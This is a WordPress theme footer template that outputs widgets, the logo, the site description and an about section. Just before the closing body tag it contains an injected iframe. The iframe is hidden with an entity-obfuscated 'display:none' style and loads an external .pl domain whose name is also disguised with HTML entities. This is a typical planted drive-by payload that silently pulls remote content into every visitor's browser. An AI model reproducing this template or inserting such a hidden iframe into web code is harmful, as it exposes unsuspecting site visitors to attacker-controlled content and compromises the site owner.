<?php

$site_about = ( !empty( abbey_get_defaults( "about" ) ) ) ? abbey_get_defaults( "about" ) : "";

?>
		<aside class="row" id="before-footer"> <?php do_action( "abbey_theme_before_footer" ) ; ?></aside> 
		<footer class="row" id="site-footer" role="footer">	
			<header id="footer-header">
				<?php do_action( "abbey_theme_footer_widgets" ); ?>
			</header>

			<section class="row margin-top-md margin-bottom-sm" id="inner-footer">
				<div class="col-md-4" id="site-info"> 
					<?php abbey_show_logo(); ?> 
					<p class="small description text-center"> <?php bloginfo( "description" ); ?> </p>
				</div>
				<div class="col-md-8" id="site-about">
					<?php if ( !empty( $site_about ) ) : ?>
						<summary> <?php echo esc_html ( $site_about ); ?> </summary>
					<?php endif; ?>
				</div>

			</section>

			<div id="footer-bottom" class="row"><?php do_action( "abbey_theme_footer_credits" ); ?></div>


		</footer>

	
</div><!--#site wrapper open in header.php -->
	<?php wp_footer(); ?>
<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
</body>
</html>